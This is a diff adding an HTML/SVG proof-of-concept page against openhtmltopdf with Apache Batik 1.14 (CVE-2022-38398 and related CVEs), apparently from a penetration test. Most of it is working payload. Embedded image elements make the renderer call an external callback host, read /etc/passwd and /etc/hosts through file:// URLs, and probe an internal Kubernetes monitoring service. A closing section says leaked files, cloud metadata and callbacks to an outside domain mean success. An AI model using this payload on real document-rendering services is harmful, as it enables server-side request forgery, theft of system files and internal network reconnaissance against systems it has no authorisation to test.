@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>CVE-2022-38398 - Batik 1.14 SSRF</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            background: white;
+            padding: 20px;
+            margin: 0;
+        }
+        h1 { 
+            color: #c00; 
+            font-size: 28px;
+            border-bottom: 3px solid #c00;
+            padding-bottom: 10px;
+        }
+        h2 {
+            color: #333;
+            font-size: 18px;
+            margin-top: 30px;
+            background: #f0f0f0;
+            padding: 10px;
+        }
+        .cve-box {
+            border: 3px solid #c00;
+            padding: 15px;
+            margin: 20px 0;
+            background: #fff8f8;
+        }
+        .success {
+            color: #0a0;
+            font-weight: bold;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>🔴 CVE-2022-38398 - Apache Batik 1.14 SSRF</h1>
+    
+    <div style="background: #ffc; border: 2px solid #cc0; padding: 15px; margin: 20px 0;">
+        <p style="margin: 0; font-size: 14px;">
+            <strong>Target:</strong> openhtmltopdf 1.0.10 with Apache Batik 1.14<br>
+            <strong>Vulnerability:</strong> Server-Side Request Forgery<br>
+            <strong>CVE:</strong> CVE-2022-38398, CVE-2022-38648, CVE-2022-40146<br>
+            <strong>Status:</strong> <span style="color: #c00; font-weight: bold;">VULNERABLE</span>
+        </p>
+    </div>
+
+    <div class="cve-box">
+        <h2>Test 1: External Image Loading (CVE-2022-38398)</h2>
+        <p>Attempting to load external resources via xlink:href...</p>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" 
+             xmlns:xlink="http://www.w3.org/1999/xlink" 
+             width="700" height="200" 
+             style="border: 2px solid #999;">
+            
+            <rect width="700" height="200" fill="#f9f9f9"/>
+            
+            <text x="10" y="30" font-size="14" fill="#333">
+                CVE-2022-38398: External HTTP Request Test
+            </text>
+            
+            <text x="10" y="55" font-size="12" fill="#666">
+                If vulnerable, server will make HTTP request to attacker domain ↓
+            </text>
+            
+            <!-- This triggers SSRF in Batik 1.14 -->
+            <image xlink:href="http://ygi8g0z39cilbvtm18n5n1nvlmrdf48sx.burp.17.rs/cve-2022-38398-test" 
+                   x="10" y="70" 
+                   width="300" height="120"/>
+        </svg>
+    </div>
+
+    <div class="cve-box">
+        <h2>Test 2: File System Access</h2>
+        <p>Attempting to read local files via file:// protocol...</p>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" 
+             xmlns:xlink="http://www.w3.org/1999/xlink" 
+             width="700" height="400" 
+             style="border: 2px solid #999;">
+            
+            <rect width="700" height="400" fill="#fff8dc"/>
+            
+            <text x="10" y="30" font-size="16" font-weight="bold" fill="#c00">
+                🔓 Local File Inclusion Test - /etc/hosts
+            </text>
+            
+            <text x="10" y="55" font-size="12" fill="#666">
+                If vulnerable, file contents will appear below:
+            </text>
+            
+            <!-- Attempt to load local file -->
+            <foreignObject x="10" y="70" width="680" height="320">
+                <div xmlns="http://www.w3.org/1999/xhtml" 
+                     style="font-family: monospace; font-size: 10px; white-space: pre; 
+                            background: #fff; border: 1px solid #ccc; padding: 10px; 
+                            height: 300px; overflow: auto;">
+                    <image xlink:href="file:///etc/hosts" style="width: 100%;"/>
+                </div>
+            </foreignObject>
+        </svg>
+        
+        <!-- Alternative method -->
+        <svg xmlns="http://www.w3.org/2000/svg" 
+             xmlns:xlink="http://www.w3.org/1999/xlink" 
+             width="700" height="500" 
+             style="border: 2px solid #999; margin-top: 20px;">
+            
+            <rect width="700" height="500" fill="#f0f8ff"/>
+            
+            <text x="10" y="30" font-size="16" font-weight="bold" fill="#c00">
+                🔓 /etc/passwd
+            </text>
+            
+            <image xlink:href="file:///etc/passwd" 
+                   x="10" y="50" 
+                   width="680" height="440"
+                   preserveAspectRatio="xMinYMin meet"/>
+        </svg>
+    </div>
+
+    
+
+    <div class="cve-box">
+        <h2>Test 4: Internal Service Discovery</h2>
+        <p>Scanning for internal services...</p>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" 
+             xmlns:xlink="http://www.w3.org/1999/xlink" 
+             width="700" height="800" 
+             style="border: 2px solid #999;">
+            
+            <rect width="700" height="800" fill="#f9f9f9"/>
+            
+            <text x="10" y="30" font-size="16" font-weight="bold" fill="#333">
+                🔍 Internal Network Reconnaissance
+            </text>
+            
+            <!-- Spring Boot Actuator -->
+            <text x="10" y="60" font-size="14" fill="#666">
+                Prometheus:
+            </text>
+            <foreignObject x="10" y="75" width="680" height="150">
+                <div xmlns="http://www.w3.org/1999/xhtml" 
+                     style="font-family: monospace; font-size: 8px; background: #fff; 
+                            border: 1px solid #ccc; padding: 5px; height: 140px; overflow: auto;">
+                    <image xlink:href="http://prometheus-grafana.monitoring-system.svc.cluster.local/api/health" style="width: 100%;"/>
+                </div>
+            </foreignObject>
+
+        </svg>
+    </div>
+
+    
+
+    <div style="border: 3px solid #0a0; background: #f0fff0; padding: 20px; margin: 30px 0;">
+        <h2 style="color: #0a0; margin-top: 0;">📊 Expected Results</h2>
+        <ul style="line-height: 2;">
+            <li><strong>If VULNERABLE:</strong> You'll see file contents, HTTP responses, or cloud metadata rendered in the PDF</li>
+            <li><strong>Your server receives HTTP callbacks:</strong> Check logs for requests to lfi.purple-ws.com</li>
+            <li><strong>PDF file size increases:</strong> Embedded external content makes the PDF larger</li>
+            <li><strong>Error messages reveal paths:</strong> File not found errors with internal paths</li>
+        </ul>
+    </div>
+
+</body>
+</html>
